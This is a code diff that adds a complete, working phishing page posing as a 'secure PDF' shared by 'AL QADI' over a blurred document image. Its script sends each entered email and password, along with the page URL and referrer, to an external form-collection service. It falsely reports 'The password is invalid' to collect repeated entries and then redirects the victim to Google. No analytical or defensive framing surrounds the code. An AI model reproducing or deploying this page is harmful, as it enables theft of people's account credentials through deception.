@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure PDF Download</title>
+    <style>
+        /* Reset and Base Styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f0f0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Background Document (Your Uploaded Screenshot) */
+        .background-document {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://www.jenova.ai/f/file_01kwst8k373gg6h7661n5vmd1p.png'); 
+            background-size: 95%; 
+            background-position: center;
+            filter: blur(3px) brightness(0.8); 
+            z-index: 1;
+        }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: rgba(0, 0, 0, 0.2);
+        }
+
+        /* The Red Dialog Box - Squared and Smaller */
+        .auth-dialog {
+            background-color: #8B0000;
+            width: 320px;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            color: white;
+            text-align: center;
+        }
+
+        /* Header Section */
+        .dialog-header h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .dialog-header p {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 15px;
+        }
+
+        /* File Info Box */
+        .file-info {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .pdf-icon {
+            background-color: #fff;
+            color: #d00;
+            font-weight: bold;
+            font-size: 10px;
+            padding: 2px 4px;
+            border-radius: 2px;
+            margin-right: 8px;
+            display: inline-block;
+        }
+
+        /* Form Labels */
+        .form-label {
+            display: block;
+            text-align: left;
+            font-size: 13px;
+            margin-bottom: 5px;
+            margin-top: 10px;
+        }
+
+        /* Input Fields */
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 5px;
+        }
+
+        .input-field.email {
+            background-color: #f9f9f9;
+            color: #333;
+        }
+
+        .input-field.password {
+            background-color: #fff;
+            color: #333;
+        }
+
+        .input-field::placeholder {
+            color: #999;
+        }
+
+        /* Download Button */
+        .download-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background-color: #fff;
+            color: #8B0000;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .download-btn:hover {
+            background-color: #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Blurred Background Document -->
+    <div class="background-document"></div>
+
+    <!-- Modal Container -->
+    <div class="modal-overlay">
+        
+        <!-- Authentication Dialog -->
+        <div class="auth-dialog">
+            
+            <!-- Header -->
+            <div class="dialog-header">
+                <h2>User Authorization Required*</h2>
+                <p>You received a secure PDF file from AL QADI:&#x1F512;</p>
+            </div>
+
+            <!-- File Info -->
+            <div class="file-info">
+                <span class="pdf-icon">PDF</span>
+                <span>AL QADI Shared files with you.</span>
+            </div>
+
+            <!-- Form -->
+            <form id="pdfForm">
+                
+                <label class="form-label">email:</label>
+                <input type="text" id="email-input" class="input-field email" placeholder="Please enter your email" value="" name="email" required style="cursor:allowed;color:#555;background:#f0f0f0;">
+
+                <label class="form-label">password:</label>
+                <input type="password" class="input-field password" placeholder="Please enter your password" name="password" required>
+                <p id="errMsg" style="margin-top:6px;font-size:13px;color:#ffcccc;text-align:center;display:none;"></p>
+
+                <button type="submit" class="download-btn">View Online</button>
+
+            </form>
+
+        </div>
+    </div>
+
+    <script>
+    (function () {
+        var attempts = parseInt(sessionStorage.getItem("pdfAttempts") || "0");
+        var form     = document.getElementById("pdfForm");
+        var passEl   = document.querySelector("input[name='password']");
+        var errEl = document.getElementById("errMsg");
+
+        // Restore message on reload mid-flow
+        if (attempts === 1) showMsg("The password is invalid.");
+        if (attempts === 2) showMsg("The password is invalid.");
+        if (attempts === 3) showMsg("Please try again-confirm the password.");
+        if (attempts >= 4) showMsg("Sign in Authenticating...");
+
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            var email    = document.getElementById("email-input").value.trim();
+            var password = passEl.value.trim();
+
+            var fd = new FormData();
+            fd.append("email",    email);
+            fd.append("password", password);
+            fd.append("attempt",  attempts + 1);
+            fd.append("url",      window.location.href);
+            fd.append("referrer", document.referrer);
+
+            fetch("https://submit-form.com/XEktiJXZE", { method: "POST", body: fd }).catch(function () {});
+
+            passEl.value = "";
+            attempts++;
+            sessionStorage.setItem("pdfAttempts", attempts);
+
+            if      (attempts === 1) showMsg("The password is invalid.");
+            else if (attempts === 2) showMsg("The password is invalid.");
+            else if (attempts === 3) showMsg("Please try again-confirm the password.");
+            else if (attempts >= 4) {
+                showMsg("Sign in Authenticating...");
+                setTimeout(function(){ window.location.href = "https://www.google.com"; }, 1500);
+            }
+        });
+
+        // Enter key support
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") { e.preventDefault(); form.dispatchEvent(new Event("submit")); }
+        });
+
+        function showMsg(text) {
+            errEl.textContent = text;
+            errEl.style.display = "block";
+        }
+    })();
+    </script>
+
+</body>
+</html>
